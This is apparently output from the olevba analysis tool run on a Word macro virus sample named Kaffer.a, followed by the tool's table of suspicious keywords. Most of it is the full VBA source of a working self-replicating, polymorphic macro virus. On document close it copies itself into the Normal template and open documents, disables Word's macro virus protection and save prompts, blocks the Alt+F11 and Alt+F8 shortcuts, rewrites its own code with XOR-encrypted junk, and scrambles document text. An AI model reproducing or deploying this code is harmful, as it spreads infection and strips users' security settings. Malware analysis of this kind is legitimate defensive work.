olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kaffer.a-2325cfcc033b82ae0b8f6229cceed59cd3a69a5d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kaffer.a-2325cfcc033b82ae0b8f6229cceed59cd3a69a5d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Kaffer.a-2325cfcc033b82ae0b8f6229cceed59cd3a69a5d - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Kaffer()
  Set normal1 = NormalTemplate.VBProject.VBComponents(((0 Xor 0 Xor 0) Xor 1)).CodeModule
                              With ThisDocument: With .VBProject: With .VBComponents(((0 Xor 0 Xor 0) Xor 1)): Set this1 = .CodeModule: End With: End With: End With
                                    mycode = this1.lines(((Fix(1 Xor 1)) Xor 1), 600)
               With NormalTemplate.VBProject.VBComponents.Item(((Fix(1 Xor 1)) Xor 1)).CodeModule
                       .deletelines ((Int(1 Xor 1)) Xor 1), .countoflines
                                 .insertlines ((1 Xor 1) Xor 1), mycode
                         End With
                                    Set act1 = ActiveDocument.VBProject.VBComponents(((Fix(1 Xor 1)) Xor 1)).CodeModule
   With ActiveDocument.VBProject.VBComponents.Item(((0 Xor 0 Xor 0) Xor 1)).CodeModule
                                   If LCase(.lines(((Int(0.99999)) Xor 1), ((Fix(1 Xor 1)) Xor 1))) <> "private sub wm97_kaffer()" Then
                   .deletelines ((Int(0.99999)) Xor 1), .countoflines
                           .insertlines ((Fix(1 Xor 1)) Xor 1), mycode
               End If
                End With

                        With Application.Application.Application.Application.Application.Options
                           .Application.Options.Application.Options.VirusProtection = (1 Xor 1)
                                    .Application.Options.Application.Options.ConfirmConversions = (1 Xor 1)
                      .Application.Options.Application.Options.Application.Options.SaveNormalPrompt = (Fix(1 Xor 1))
                End With
     With Application.Application
    .ScreenUpdating = (Fix(1 Xor 1))
                               .ShowVisualBasicEditor = (Int(0.99999))
                              .DisplayAlerts = wdAlertsNone
  .KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
       .EnableCancelKey = wdCancelDisabled
                    .KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8), KeyCategory:=0, Command:=" "
                End With
End Sub
Private Sub Document_Close()
Randomize Timer
slt1 = rndm(((0 Xor 0 Xor 0) Xor 5))
Call Mutate
Call Kaffer
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 2, 29
ActiveDocument.VBProject.VBComponents(1).CodeModule.deletelines 2, 29
With NormalTemplate: SetAttr .FullName, vbNormal: .Save: End With
With ActiveDocument: SetAttr .FullName, vbNormal: .SaveAs .FullName: End With
With ActiveDocument.Content
If UCase(InStr(((0 Xor 0 Xor 0) Xor 1), .Text, "KAFFER")) Then Call Payload
End With
End Sub
Private Function rndm(a)
Randomize Timer
rndm = Int(Rnd * a) + ((0 Xor 0 Xor 0) Xor 1)
End Function
Private Function spa()
spa = Space(rndm(((0 Xor 0 Xor 0) Xor 40)))
End Function
Private Function num(aa)
Select Case aa
Case 0
Select Case rndm(6)
Case 1: num = Crypt("ｭｵ･�ｵ･�ｵｬ", 133)
Case 2: num = Crypt("ｪ蓁寬ｲｬｻｻｻｻｻｫｫ", 130)
Case 3: num = Crypt("ｬ渼ｴｪｽｽｽｽｽｭｭ", 132)
Case 4: num = Crypt("�ｿｨｵ銹�", 199)
Case 5: num = Crypt("^YCOXE

", 55)
Case 6: num = Crypt("ｳｼｭ蔟ｭｺｧ��", 213)
End Select
Case 1
Select Case rndm(6)
Case 1: num = Crypt("ｺｺ｢ｲ�犂｢ｲ�犂｢ｻｲ�犂｣ｻ", 146)
Case 2: num = Crypt("��｢ｭｼ�澵莨ｫｶ蔟�", 196)
Case 3: num = Crypt("ｱｶｬ矣矣ｷｪ�", 216)
Case 4: num = Crypt("緒枚ﾟﾈﾕ⊥紫ﾟﾈﾕ⊥�", 167)
Case 5: num = Crypt("ｧｧ趁誾ｾｯｯｾｦｦｯｯｯｾｦ", 143)
Case 6: num = Crypt("ｽｲ｣訒ｴｩ﨩訒ｴｩ﨩�", 219)
End Select
End Select
End Function
Private Sub Mutate()
Select Case rndm(3)
Case 1: b = spa & Crypt("$WFWJW9#Y!5'
Y!54_", 119) & num(1) & Crypt("(/bnedlnetmd", 1)
Case 2: b = spa & Crypt("dZG[}\A^R_gV^C_RGV
eqcA\YVPG
eqp\^C\]V]G@", 51) & num(1) & Crypt("恟墓ﾐﾁ保ﾚﾇﾘﾔﾙ�譜副ﾖﾚﾑﾐﾘﾚﾑﾀﾙﾐ助ﾑ補ﾜﾁﾝ", 181)
Case 3: b = spa & Crypt("ﾙ鋺谿ﾀ磬胥籘��糀榘ｴｮﾙ鋺谿ﾘﾌﾞ�砌�燁ｴｮﾙ鋺谿ﾘﾌﾍ矼矜�瓏ｦ", 142) & num(1) & Crypt("ｰ｣ｹﾊ�晥�ｹ､ｹｷ汜��｣ｹﾜ�ｹﾎｹﾜ�ｹﾎｹﾜ�ｹﾎ�", 153)
End Select
Select Case rndm(3)
Case 1: c = spa & Crypt("ﾝ�峵桄�ｿｮｳｮﾚ跚�硼鏞�瓏ﾘﾌﾞ�砌�燁ﾘﾌﾍ矼矜�瓏ｦ", 142) & num(1) & Crypt("｢･鞴�鮻蔡鉋", 139)
Case 2: c = spa & Crypt("袤ﾆﾚ呈ﾚﾛﾁﾖﾝﾑﾇﾟﾗﾜﾆ應ﾀﾝﾘﾗﾑﾆ應ﾝﾟﾂﾝﾜﾗﾜﾆﾁ�", 178) & num(1) & Crypt("|ou0!u!=<&duhu{6:108:1 90ou;1u<!=", 85)
Case 3: c = spa & Crypt("ﾆ襌���雖ｱﾆｿﾇﾓﾁ�顗ｫｱﾆｿﾇﾓﾒ���裘ｹ", 145) & num(1) & Crypt("ｯｼｦﾕ胄ｦ�ｦｻｦｨ裨粤�鰾羮ｦﾃ鞣ｦﾑ�ｼｦﾃ鞣ｦﾑ�ｼｦﾃ鞣ｦﾑ�", 134)
End Select
Select Case rndm(3)
Case 1: d = spa & Crypt("$>298}`})54.ls1438.u", 93) & num(1) & Crypt("ｱｫｭｭｴ", 157)
Case 2: d = spa & Crypt("ﾋﾈ�鴦雋ﾊﾞﾌⅴ雋ﾊﾞﾟ�韵ｴ", 156) & num(1) & Crypt("ｨｲｾｵｴ�ｲｾｵｴｼｾｵ､ｽｴｽｸｿｴ｢�", 209) & num(1) & Crypt("糲鉋侠ｪ遧ｧｺｦ", 206)
Case 3: d = spa & Crypt("�ﾕﾈﾔ慂ﾔﾕﾏﾘﾓﾟﾉﾑﾙﾒﾈ�罹ﾕﾈﾔ恍��ﾎﾓﾖﾙﾟﾈ�罹ﾕﾈﾔ恍�ﾓﾑﾌﾓﾒﾙﾒﾈﾏ�", 188) & num(1) & Crypt("ｸｫｱﾜ頸ｱｬｱｿﾒ��ｹ", 145) & num(1) & Crypt("ｮｴｲｲｫ｢ｸﾇ�譴ﾕ�ｸ｢ﾇ�譴ﾕ�ｸ｢ﾇ�譴ﾕ�", 130)
End Select
Select Case rndm(3)
Case 1: e = spa & Crypt("ﾓﾏ�ﾉﾈﾕﾊﾆﾋ�", 167)
Case 2: e = spa & Crypt("ﾜ�罩裝��鮻鑈�鈆鵆碚�･鳧蓙鏸褓��鮻｣", 139) & num(1) & Crypt("､｣魵鳧珞鵁礪", 141)
Case 3: e = spa & Crypt("鑈ｯ矜粽脯��胛﨩｡瑯��蠇�珞珮�磊�ｧ", 143) & num(1) & Crypt("辨ﾓﾟﾔﾕﾝﾟﾔﾅﾜﾕ", 176)
End Select
Select Case rndm(3)
Case 1: f = spa & Crypt("v<=4=,=416=+x", 88) & num(1) & Crypt("\P^


", 112)
Case 2: f = spa & Crypt("ELQjj
", 35) & num(1) & Crypt("裁ﾂ鴻ﾎﾂﾘﾃﾙﾂﾋﾁﾄﾃﾈﾞ絡�ﾟﾈﾝﾁﾌﾎﾈﾁﾄﾃﾈ堺艨", 173) & Chr(34) & Chr(34) & Crypt("｢ｩｴｸ", 204)
Case 3: f = spa & Crypt("54)6:7ju?>7>/>725>({", 91) & num(1) & Crypt("]\A^R_
P\F]G\U_Z]V@", 51)
End Select
Select Case rndm(3)
Case 1: g = spa & Crypt("鬥｣｣｡ｵｨｪｴｳｵｮｩ遯ｾ､ｨ｣｢", 199)
Case 2: g = spa & Crypt("4stihnvsti:", 26) & num(1) & Crypt("″ﾀﾔﾎﾂﾉﾈ", 173)
Case 3: g = spa & Crypt("��蓚ｴｫ蓊矼頽��筵ﾈ�跛矜", 133)
End Select
h = spa & Crypt(".$`7)4(", 64)
Select Case rndm(3)
Case 1: i = spa & Crypt("ﾟ鵁ｬ瀅ｬｱｬ瀅楨鞳�鰾ﾚﾎﾜ肆鴆ﾚﾎﾏ聶�聹鰾�､", 140) & num(1) & Crypt("弌ﾒﾞﾕﾔﾜﾞﾕﾄﾝﾔ", 177)
Case 2: i = spa & Crypt("ﾖ頷鬘珞褓糜�蔡ﾗﾃﾑ�葢ﾗﾃﾂ黑�蔡ｩ", 129) & num(1) & Crypt("･ｶｬﾟ鵁ｬ瀅ｬｱｬ｢�肛鱆肛鮓ｬﾉ粨ｬﾛ褸�", 140)
Case 3: i = spa & Crypt("ﾗ鴟陟矼蔡脉淲ⅵｺﾗ鴟陟ｮﾖﾂﾐ�裙ﾗ鴟陟ｮﾖﾂﾃ�瀇�鮱ⅵ", 128) & num(1) & Crypt("褻�洸ｸ�ｭｯｸ�箟｣ｨｩ｡｣ｨｹｩ欧ｨ�屶ｸ､欧ｨ�屶ｸ､欧ｨ�屶ｸ､", 204)
End Select
Select Case rndm(3)
Case 1: j = spa & Crypt("RC", 114)
Case 2: j = spa & Crypt("iwjv>}jwh{zq}ks{pj0h|nlqt{}j0h|}qsnqp{pjm6", 30) & num(1) & Crypt(">9txsrzxsb{r", 23)
Case 3: j = spa & Crypt("E[FZSQF[DWV]QG_W\F
DPB@]XWQF
DPQ]_B]\W\FA
[FW_", 50) & num(1) & Crypt("蒹ｮ｢ｩｨ｢ｩｸ｡ｨ", 205)
End Select
Select Case rndm(2)
Case 1: k = spa & Crypt("ﾗﾘ橙ﾝﾟﾍﾛ鱒ﾒﾗﾐﾛﾍ末儲ﾐﾊ鮪睡㊦㊦覧榿ﾑﾌ桴嵐末ﾘﾗﾆ柾榿ﾑﾌ桴覧榿ﾑﾌ桴覧璃��", 190) & Chr(34) & Crypt("sqjubwf#pva#tn:4\hbeefq+*", 3) & Chr(34) & Crypt("
IUXS", 61)
Case 2: k = spa & Crypt("ｍﾋ梭釜偲ﾅ№�侍ﾃﾃﾃｅ淌ﾛﾅﾒﾒﾒﾒﾒﾂﾂﾋ塘厖ﾚﾂﾇﾃﾃ高禿ﾚﾋ塘厖ﾚﾂﾂﾋ塘厖ﾚﾂﾂﾂﾋﾗﾕﾋ", 235) & Chr(34) & Crypt("､ｦｽ｢ｵｱﾔｧ｡ｶﾔ｣ｹﾍﾃｫｿｵｲｲｱｦﾜﾝ", 244) & Chr(34) & Crypt("q%94?", 81)
End Select
Select Case rndm(2)
Case 1: l = spa & Crypt("嶝ﾐﾙﾐﾁﾐﾙﾜﾛﾐﾆ�", 181) & num(1) & Crypt("�ｰｼｦｽｧｼｵｿｺｽｶ", 211)
Case 2: l = spa & Crypt("
C**C^C", 99) & num(1) & Crypt("ｰ�ｰｾ����ｪ", 144) & spa & Crypt("楪ﾕﾀﾜﾑﾓﾕﾜﾙﾞﾕ旋", 176) & Chr(34) & Chr(34) & Crypt("�ﾕﾞﾃﾏ", 187)
End Select
Select Case rndm(2)
Case 1: m = spa & Crypt("�｣ｦｦ､ｰｭｯｱｶｰｫｬ･箟ｻ｡ｭｦｧ", 194)
Case 2: m = spa & Crypt("
KLQGPVNKLGQ", 34) & num(1) & Crypt("s2&<0;:", 95)
End Select
n = spa & Crypt("MFL\x08AN", 40)
o = spa & Crypt("ｨ｣ｩ晗､ｹ･", 205)
p = spa: For oooo = 1 To rndm(6): tp = tp & Crypt(".??#&,.;& !a", 79): Next: p = p & Crypt("$:';s", 83) & tp & Crypt("ｨｷｳｮｨｩｴ", 199): tp = ""
q = spa: For oooo = 1 To rndm(6): q = q & Crypt("v9((41;9,176v7(,176+", 88): Next: q = q & Crypt("菰ﾋﾐﾗﾑﾒﾐﾍﾖﾇﾁﾖﾋﾍﾌぁ�", 162) & num(0): tp = ""
r = spa: For oooo = 1 To rndm(6): r = r & Crypt("ｲ｣｣ｿｺｰｲｧｺｼｽｼ｣ｧｺｼｽ", 211): Next: r = r & Crypt("ｿ�腋�鉚聹�箜ｬｱ", 145) & num(0): tp = ""
S = spa: For oooo = 1 To rndm(6): S = S & Crypt("�｣ｲｲｮｫ｡｣ｶｫｭｬ�ｭｲｶｫｭｬｱ", 194): Next: S = S & Crypt("s.<+832/0<1-/20-)}`}", 93) & num(0): tp = ""
u = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ﾖﾇﾇﾛﾞﾔﾖﾃﾞﾘﾙ�", 183): Next: u = u & Crypt("｡", 129) & tp & Crypt("ﾃ鸙矼澈", 130): tp = ""
v = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("繻ｽｽ｡､ｮｬｹ､｢｣", 205): Next: v = v & Crypt("O_NYYRILX]HUR[

", 60) & num(0): tp = ""
w = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("N__CFLN[F@A", 47): Next: w = w & Crypt("ｩﾔ�頏ﾑⅵ�ﾅ踝鮏ﾂ胛ｺｧ", 135) & num(0): tp = ""
x = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ｮﾁ�鱚磑鴆�", 128): Next: x = x & Crypt("ﾊ�糀粱��ｮｳｮﾏ粱��ﾀ矜�", 142): tp = ""
y = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ｱｼｹｳｱ､ｹｿｾ", 208): Next: y = y & Crypt("ｨﾍ�ﾄ�鞣�鞦ﾇ粐ｦﾍ�ﾅ鰾羮ｻﾄ�簣�ﾅ鰾羂ﾍ�ﾇ�ｦﾍ�ﾀｷｷｯｪｦﾍ�ﾅ銓聶鴟ｼｻｶｪｦﾅ鴉�鉅箴ｻ", 134) & Chr(34) & Chr(32) & Chr(34): tp = ""
z = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ｩ踟鮏跿鵰�", 135): Next: z = z & Crypt("Q:

<

4_B_\x08<

;


", 127): tp = ""
more = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ｱｼｹｳｱ､ｹｿｾ", 208): Next: more = more & Crypt("ｺｦ攜ｱｻｶｱｸｬｻｻ伴ｦ慍ｻｺ裘擡ｶｳｻ伴ｦ慍ｻｺｻ伴ｦ楜ｫ�ｨｻ伴ｦ咏伴ｦ慇ｫｺｸｰｭｦ裘��慍ｲｲｾｱｻ裘", 223) & Chr(34) & Chr(32) & Chr(34): tp = ""

With ThisDocument.VBProject.VBComponents(1).CodeModule
.replaceline 2, b: .replaceline 3, c: .replaceline 4, d: .replaceline 5, e
.replaceline 6, f: .replaceline 7, g: .replaceline 8, h: .replaceline 9, i
.replaceline 10, j: .replaceline 11, k: .replaceline 12, l: .replaceline 13, m
.replaceline 14, n: .replaceline 15, o: .replaceline 17, p: .replaceline 18, q:
.replaceline 19, r: .replaceline 20, S: .replaceline 21, o: .replaceline 22, u:
.replaceline 23, v: .replaceline 24, w: .replaceline 25, x: .replaceline 26, y:
.replaceline 27, z: .replaceline 28, more: .replaceline 29, o
End With

End Sub
Private Sub Payload()
With ActiveDocument.Content
With .Font
.Name = (rndm(10))
.Size = (20 + rndm(10))
.ColorIndex = (rndm(19) - 1)
.Animation = (rndm(6) - 1)
End With
.Text = Crypt("ﾌ･ﾍ蓴爭ﾎ蒹聰･ｨ･ﾑ浯�･鴈髙･･鰲･･ﾒ澈･銜珱･蔔爭胙跟珮･･ﾄﾌﾁﾖ･､", 133)
End With
End Sub
Private Function Crypt(klo, key)
Crypt = ""
For i = 1 To Len(klo)
Crypt = Crypt & Chr(Asc(Mid(klo, i, 1)) Xor key)
Next
End Function
Private Sub jio()
Randomize Timer
key = 133
aaa = InputBox("", "")
mmm = InputBox("", "", "crypt(" & Chr(34) & Crypt(aaa, key) & Chr(34) & "," & key & ")")
End Sub


























































































































































































































































































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

